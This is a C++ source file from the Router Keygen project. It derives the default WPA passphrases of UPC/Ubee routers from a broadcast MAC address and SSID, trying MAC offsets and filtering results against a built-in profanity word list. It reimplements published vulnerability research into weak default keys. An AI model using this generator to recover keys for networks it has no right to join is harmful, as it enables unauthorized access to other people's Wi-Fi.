/*
 * Copyright 2016 Alex Stanev <alex@stanev.org>
 *
 * Based on https://github.com/yolosec/upcgen, ubee_keys.c
 *
 * This file is part of Router Keygen.
 *
 * Router Keygen is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Router Keygen is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Router Keygen.  If not, see <http://www.gnu.org/licenses/>.
 */

#include "Upc07UbeeKeygen.h"
#include <QRegExp>
#include <stdio.h>
#include <openssl/md5.h>

Upc07UbeeKeygen::Upc07UbeeKeygen(QString ssid, QString mac) :
		Keygen(ssid, mac) {
    kgname = "Upc07Ubee";
}

int Upc07UbeeKeygen::getSupportState() const{
    if ( getSsidName().contains(QRegExp("^UPC[0-9]{7}$")) )
        return SUPPORTED;
    return UNLIKELY;
}

const char* Upc07UbeeKeygen::UBEE_NONINSULTING_ALPHABET = "BBCDFFGHJJKLMNPQRSTVVWXYZZ";
const char* Upc07UbeeKeygen::profanities[] = {
        "ABBO",       "ABUSE",      "ACOCK",      "AGGRO",      "AIDS",       "ANAL",       "ANNAL",      "ANNAS",      "ARSES",
        "ARSIS",      "ASS",        "ASSAI",      "ASSAY",      "ASSES",      "ASSET",      "BABES",      "BALL",       "BALLS",
        "BALLY",      "BANAL",      "BANGS",      "BARFS",      "BARMY",      "BASTARD",    "BAWDS",      "BAWDY",      "BAWLS",
        "BEERS",      "BELCH",      "BIGOT",      "BIMBO",      "BINGE",      "BITCH",      "BLONDE",     "BLOOD",      "BLOW",
        "BLOWN",      "BLOWS",      "BLOWY",      "BOFFS",      "BOGAN",      "BOLES",      "BOLLS",      "BONDAGE",    "BONED",
        "BONER",      "BONGS",      "BONKS",      "BOOBS",      "BOOBY",      "BOOTY",      "BOOZE",      "BOOZY",      "BOWEL",
        "BOYS",       "BOZOS",      "BRATS",      "BROTHEL",    "BUSHY",      "BUSTS",      "BUSTY",      "BUTCH",      "BUTT",
        "BUTTE",      "BUTTS",      "BUTTY",      "BUXOM",      "CANAL",      "CARNY",      "CECUM",      "CHEST",      "CHICS",
        "CHINK",      "CHOAD",      "CHOTT",      "CHOWS",      "CHUBS",      "CHUCK",      "CHUFA",      "CHURR",      "CLITS",
        "COCCI",      "COCK",       "COCKS",      "COCKY",      "COCOS",      "COKED",      "COKES",      "COOFS",      "COON",
        "COONS",      "CRABS",      "CRACK",      "CRAP",       "CRAPS",      "CROZE",      "CRUCK",      "CRUDE",      "CRUDS",
        "CUM",        "CUMIN",      "CUNT",       "CUNTS",      "CUPEL",      "CURNS",      "CURST",      "CURVY",      "CUTIE",
        "DAGOS",      "DANDY",      "DARKY",      "DEMON",      "DESEX",      "DEVIL",      "DICK",       "DICKS",      "DICKY",
        "DIKED",      "DIKER",      "DIKES",      "DIKEY",      "DILDO",      "DIRT",       "DIRTY",      "DITCH",      "DODGE",
        "DODGY",      "DOGGY",      "DONGA",      "DONGS",      "DOPE",       "DOPED",      "DOPER",      "DORKS",      "DORKY",
        "DRAPE",      "DRUBS",      "DRUGS",      "DRUNK",      "DRUPE",      "DRUSE",      "DUMB",       "DWARF",      "DWEEB",
        "DYKED",      "DYKES",      "DYKEY",      "DYNES",      "EBONY",      "ENEMA",      "ERECT",      "EVILS",      "FADOS",
        "FAERY",      "FAG",        "FAGOT",      "FAIRY",      "FANNY",      "FANON",      "FARDS",      "FARTS",      "FATSO",
        "FATTY",      "FATWA",      "FAUGH",      "FECAL",      "FECES",      "FECKS",      "FEELS",      "FEEZE",      "FELCH",
        "FETAL",      "FETAS",      "FILCH",      "FILTH",      "FISHY",      "FISTS",      "FITCH",      "FITLY",      "FLAPS",
        "FLESH",      "FLEWS",      "FLEYS",      "FLOGS",      "FLONG",      "FORKS",      "FORKY",      "FORME",      "FREAK",
        "FRIGS",      "FRUMP",      "FUCK",       "FUCKS",      "FUCUS",      "FUDGE",      "FUGGY",      "FUSTY",      "FUZEE",
        "FUZES",      "FUZZY",      "FYKES",      "FYTTE",      "GAILY",      "GANJA",      "GAPED",      "GAPER",      "GAPES",
        "GAPPY",      "GASTS",      "GEEKS",      "GIMP",       "GIRLS",      "GIRLY",      "GIVER",      "GIZED",      "GONAD",
        "GOOEY",      "GOOFS",      "GOOFY",      "GOOKS",      "GOONS",      "GOOPS",      "GOOPY",      "GRAPE",      "GROAT",
        "GROGS",      "GROIN",      "GROPE",      "GUANO",      "HADAL",      "HADED",      "HADES",      "HADJI",      "HADST",
        "HAEMS",      "HAETS",      "HAIRY",      "HAREM",      "HATE",       "HEAD",       "HEMES",      "HEMPS",      "HEMPY",
        "HERPES",     "HOBOS",      "HOKED",      "HOKES",      "HOKEY",      "HOKKU",      "HOKUM",      "HOLE",       "HOMER",
        "HOMES",      "HOMEY",      "HOMOS",      "HONKY",      "HOOCH",      "HOOKA",      "HORNY",      "HUMPH",      "HUMPS",
        "HUMPY",      "HUSSY",      "HUTCH",      "HUZZA",      "HYING",      "HYMEN",      "HYPOS",      "IDIOT",      "ITCHY",
        "JAIL",       "JERKS",      "JERKY",      "JOCKS",      "JOINT",      "JORAM",      "JORUM",      "JOTAS",      "JOUAL",
        "JOUKS",      "JUDAS",      "JUGUM",      "KIKES",      "KILIM",      "KINKS",      "KINKY",      "KNOBS",      "KOLOS",
        "KONKS",      "KOOKS",      "KOOKY",      "KOPHS",      "KOPJE",      "KOPPA",      "KOTOS",      "KRAFT",      "LABIA",
        "LABRA",      "LATEX",      "LEERS",      "LEERY",      "LEGGY",      "LEMON",      "LEPTA",      "LETCH",      "LEZZY",
        "LICK",       "LICKS",      "LIDOS",      "LIMEY",      "LOADS",      "LOSER",      "LOVED",      "LOVER",      "LOVES",
        "LOWED",      "LUSTS",      "LUSTY",      "LYSES",      "LYSIN",      "LYSIS",      "LYSSA",      "LYTTA",      "MAARS",
        "MADAM",      "MANIA",      "MANIC",      "MICHE",      "MICKS",      "MICRA",      "MILF",       "MINGE",      "MOANS",
        "MOIST",      "MOLES",      "MOLEST",     "MORON",      "MOUNT",      "MOUTH",      "MUCKS",      "MUCKY",      "MUCOR",
        "MUCRO",      "MUCUS",      "MUFFS",      "NAIVE",      "NAKED",      "NANCY",      "NARCO",      "NARCS",      "NARDS",
        "NARES",      "NARKS",      "NARKY",      "NASAL",      "NASTY",      "NATAL",      "NATCH",      "NATES",      "NERDS",
        "NIGER",      "NOGGS",      "NOHOW",      "NOILS",      "NOSEY",      "NUBIA",      "NUCHA",      "NUDER",      "NUDES",
        "NUDIE",      "NUKED",      "NUKES",      "OBESE",      "OPING",      "OPIUM",      "OVARY",      "PADDY",      "PANSY",
        "PANTS",      "PENIS",      "PERKY",      "PILEI",      "PILES",      "PILIS",      "PILLS",      "PIMP",       "PIMPS",
        "PISS",       "PLUCK",      "PLUGS",      "PLUMP",      "POKED",      "POKER",      "POKES",      "POKEY",      "POLED",
        "POLER",      "POMMY",      "POODS",      "POOFS",      "POOFY",      "POOPS",      "PORGY",      "PORKS",      "PORKY",
        "PORN",       "PORNO",      "PORNS",      "POSED",      "POTTO",      "POTTY",      "POUFS",      "PREST",      "PREXY",
        "PRICK",      "PROSO",      "PROSTITUTE", "PROSY",      "PUBES",      "PUBIC",      "PUBIS",      "PUCKS",      "PUDIC",
        "PUFFS",      "PUFFY",      "PUKED",      "PUKES",      "PUNTO",      "PUNTS",      "PUNTY",      "PUPAE",      "PUSSY",
        "PUTTI",      "PUTTO",      "QUEER",      "QUIFF",      "RABBI",      "RABID",      "RACES",      "RACKS",      "RANDY",
        "RAPED",      "RAPER",      "RAPES",      "RECKS",      "RECTA",      "RECTI",      "RECTO",      "RIGID",      "RIMED",
        "RIMER",      "RIMES",      "ROMPS",      "ROOTS",      "ROOTY",      "ROWDY",      "RUMPS",      "RUTHRUSH",   "SCABS",
        "SCATS",      "SCATT",      "SCORE",      "SCRAG",      "SCREW",      "SCRIM",      "SEAM",       "SEEDY",      "SELVA",
        "SEMEN",      "SEWER",      "SEX",        "SEXED",      "SEXES",      "SEXTS",      "SHAFT",      "SHAGS",      "SHIT",
        "SHITS",      "SICKO",      "SICKS",      "SIRED",      "SIREN",      "SIRES",      "SIRUP",      "SISSY",      "SKIRT",
        "SLITS",      "SLOID",      "SLOPS",      "SLOTS",      "SLOWS",      "SLOYD",      "SLUT",       "SLUTS",      "SLYER",
        "SMACK",      "SMOKE",      "SMOKY",      "SMUT",       "SMUTS",      "SNOGS",      "SNOOD",      "SNOOK",      "SNOOL",
        "SNORT",      "SNOTS",      "SNUFF",      "SOOTH",      "SOOTS",      "SPANK",      "SPERM",      "SPEWS",      "SPICA",
        "SPICE",      "SPICK",      "SPICS",      "SPUNK",      "SQUAW",      "STIFF",      "STINK",      "STOOL",      "STRIP",
        "STUDS",      "SUCK",       "SUCKS",      "SUCRE",      "SUDDS",      "SUDOR",      "SWANG",      "SWANK",      "TARTS",
        "TARTY",      "TESTA",      "TESTS",      "TESTY",      "THIEF",      "THUDS",      "THUGS",      "THUJA",      "TIGHT",
        "TIGON",      "TIKES",      "TIKIS",      "TITS",       "TITTY",      "TUBAS",      "TUBBY",      "TUBED",      "TUCKS",
        "TURD",       "TURDS",      "TWATS",      "UDDER",      "UNDEE",      "UNDIE",      "UNSEX",      "UNZIP",      "UREAL",
        "UREAS",      "UREIC",      "URIAL",      "URINE",      "UVEAL",      "UVEAS",      "UVULA",      "VACUA",      "VAGINA",
        "VAGUS",      "VEINS",      "VEINY",      "VELAR",      "VELDS",      "VOMIT",      "VUGGY",      "VULGO",      "VULVA",
        "WACKS",      "WARTS",      "WEIRD",      "WENCH",      "WETLY",      "WHACK",      "WHOPS",      "WHORE",      "WILLY",
        "WIMPS",      "WIMPY",      "WINED",      "WINES",      "WINEY",      "WIZEN",      "WOADS",      "WODGE",      "WOFUL",
        "WOKEN",      "WOLDS",      "WOMAN",      "WOMBS",      "WOMBY",      "WOMEN",      "WONKS",      "WONKY",      "WOOED",
        "WOOER",      "WOOSH",      "WOOZY",      "YOBBO",      "ZOOID",      "ZOOKS"
};
const quint16  Upc07UbeeKeygen::PROFANITY_COUNT = sizeof(Upc07UbeeKeygen::profanities)/sizeof(Upc07UbeeKeygen::profanities[0]);

qint8 Upc07UbeeKeygen::ubee_generate_ssid(unsigned const char * mac, unsigned char * ssid, size_t * len) {
    MD5_CTX ctx;
    unsigned char buff1[100];
    unsigned char buff2[100];
    unsigned char h1[100], h2[100];
    memset(buff1, 0, 100);
    memset(buff2, 0, 100);
    memset(h1, 0, 100);
    memset(h2, 0, 100);

    if (len != NULL && *len < 11){
        return -1;
    }

    // MAC+hex(UPCDEAULTSSID)
    sprintf((char*)buff1, "%2X%2X%2X%2X%2X%2X555043444541554C5453534944", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    MD5_Init(&ctx);
    MD5_Update(&ctx, buff1, strlen((char*)buff1) + 1);
    MD5_Final(h1, &ctx);

    sprintf((char*)buff2, "%.02X%.02X%.02X%.02X%.02X%.02X", h1[0]&0xf, h1[1]&0xf, h1[2]&0xf, h1[3]&0xf, h1[4]&0xf, h1[5]&0xf);

    MD5_Init(&ctx);
    MD5_Update(&ctx, buff2, strlen((char*)buff2) + 1);
    MD5_Final(h2, &ctx);

    sprintf((char*)ssid, "UPC%d%d%d%d%d%d%d", h2[0]%10, h2[1]%10, h2[2]%10, h2[3]%10, h2[4]%10, h2[5]%10, h2[6]%10);
    if (len != NULL){
        *len = 10;
    }

    return 1;
}

qint8 Upc07UbeeKeygen::ubee_generate_pass(unsigned const char * mac, unsigned char * passwd, size_t * len) {
    unsigned int i=0,p=0;
    unsigned char hash_buff[100];

    if (len != NULL && *len < 9){
        return -1;
    }

    ubee_generate_pass_raw(mac, hash_buff, passwd);
    for(i=0; i<PROFANITY_COUNT; i++){
        if (strstr((char*)passwd, profanities[i]) != NULL){
            p=1;
            break;
        }
    }

    if (p>0){
        ubee_enerate_profanity_free_pass(hash_buff, passwd);
    }

    if (len != NULL){
        *len=8;
    }

    return 1;
}

qint8 Upc07UbeeKeygen::ubee_generate_pass_raw(unsigned const char * mac, unsigned char * hash_buff, unsigned char * passwd) {
    MD5_CTX ctx;
    unsigned char buff1[100];
    unsigned char buff2[100];
    unsigned char buff3[100];
    memset(buff1, 0, 100);
    memset(buff2, 0, 100);
    memset(buff3, 0, 100);
    memset(hash_buff, 0, 100);

    // 1. MAC + hex(UPCDEAULTPASSPHRASE)
    sprintf((char*)buff1, "%2X%2X%2X%2X%2X%2X555043444541554C5450415353504852415345", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    // 2.
    MD5_Init(&ctx);
    MD5_Update(&ctx, buff1, strlen((char*)buff1)+1);
    MD5_Final(buff2, &ctx);

    // 3.
    sprintf((char*)buff3, "%.02X%.02X%.02X%.02X%.02X%.02X", buff2[0]&0xF, buff2[1]&0xF, buff2[2]&0xF, buff2[3]&0xF, buff2[4]&0xF, buff2[5]&0xF);

    // 4.
    MD5_Init(&ctx);
    MD5_Update(&ctx, buff3, strlen((char*)buff3)+1);
    MD5_Final(hash_buff, &ctx);

    sprintf((char*)passwd, "%c%c%c%c%c%c%c%c",
            0x41u + ((hash_buff[0]+hash_buff[8]) % 0x1Au),
            0x41u + ((hash_buff[1]+hash_buff[9]) % 0x1Au),
            0x41u + ((hash_buff[2]+hash_buff[10]) % 0x1Au),
            0x41u + ((hash_buff[3]+hash_buff[11]) % 0x1Au),
            0x41u + ((hash_buff[4]+hash_buff[12]) % 0x1Au),
            0x41u + ((hash_buff[5]+hash_buff[13]) % 0x1Au),
            0x41u + ((hash_buff[6]+hash_buff[14]) % 0x1Au),
            0x41u + ((hash_buff[7]+hash_buff[15]) % 0x1Au));

    return 0;
}

qint8 Upc07UbeeKeygen::ubee_enerate_profanity_free_pass(unsigned char * hash_buff, unsigned char const * new_pass) {
    sprintf((char*)new_pass, "%c%c%c%c%c%c%c%c",
            UBEE_NONINSULTING_ALPHABET[((hash_buff[0]+hash_buff[8]) % 0x1Au)],
            UBEE_NONINSULTING_ALPHABET[((hash_buff[1]+hash_buff[9]) % 0x1Au)],
            UBEE_NONINSULTING_ALPHABET[((hash_buff[2]+hash_buff[10]) % 0x1Au)],
            UBEE_NONINSULTING_ALPHABET[((hash_buff[3]+hash_buff[11]) % 0x1Au)],
            UBEE_NONINSULTING_ALPHABET[((hash_buff[4]+hash_buff[12]) % 0x1Au)],
            UBEE_NONINSULTING_ALPHABET[((hash_buff[5]+hash_buff[13]) % 0x1Au)],
            UBEE_NONINSULTING_ALPHABET[((hash_buff[6]+hash_buff[14]) % 0x1Au)],
            UBEE_NONINSULTING_ALPHABET[((hash_buff[7]+hash_buff[15]) % 0x1Au)]);
    return 0;
}

void Upc07UbeeKeygen::incmac(unsigned char * mac, unsigned char * newmac, qint8 delta) {
    quint64 macInt = 0;
    int i = 0;
    for(i = 0; i<6; i++){
        macInt |= ((quint64)(mac[i] & 0xFFu)) << (8*(5-i));
    }

    macInt += delta;
    for(i = 0; i<6; i++){
        newmac[i] = (macInt >> (8*(5-i))) & 0xFFu;
    }
}

qint8 Upc07UbeeKeygen::readmac(char const * machex, unsigned char * mac) {
    quint8 i;
    //for(i=0; i<3; i++){
    //    mac[3+i] = 0;
    //}
    memset(mac, 0, 6);

    for(i=0; i<12; i++){
        quint8 v;
        quint8 c = toupper(machex[i]);
        if (c>='0' && c<='9'){
            v = c-'0';
        } else if (c>='A' && c<='F'){
            v = 10+c-'A';
        } else {
            return -1;
        }

        mac[i/2] |= (v) << 4*((i+1)%2);
    }

    return 0;
}

QVector<QString> & Upc07UbeeKeygen::getKeys() {
    unsigned char rawmac[] = {0x64, 0x7c, 0x34, 0x19, 0x3c, 0x00};
    unsigned char rawssid[16];
    unsigned char rawpass[16];
    unsigned char newMac[6];
    qint8 i;
    bool singleSearch = false;
    QByteArray bmac;
    QByteArray bssid;

    QString mac = getMacAddress();
    if ( mac.size() != 12 )
            throw ERROR;

    QString ssid = getSsidName();
    if (ssid.count(QRegExp("^UPC[0-9]{7}$")) == 1) {
        singleSearch = true;
    }

    bmac = mac.toLatin1();
    bssid = ssid.toLatin1();
    if (readmac(bmac.data(), rawmac) < 0){
        throw ERROR;
    }

    // Source MAC address used for computation of SSID & key is shifted.
    // E.g. if BSSID of WiFi ends on f9, the mac used for computation is f6 for 2.4GHz network.
    // But the same MAC is used for computation both SSID and key so thus if SSID matches, the key matches.

    for (i=-7; i<5; i++){
        incmac(rawmac, newMac, i);
        if (singleSearch) {
            ubee_generate_ssid(newMac, rawssid, NULL);
            if (strncmp(bssid.data(), (char*)&rawssid, 10) != 0) {
                continue;
            } 
        }
        ubee_generate_pass(newMac, rawpass, NULL);
        results.append((char*) &rawpass);
    }

    return results;   
}
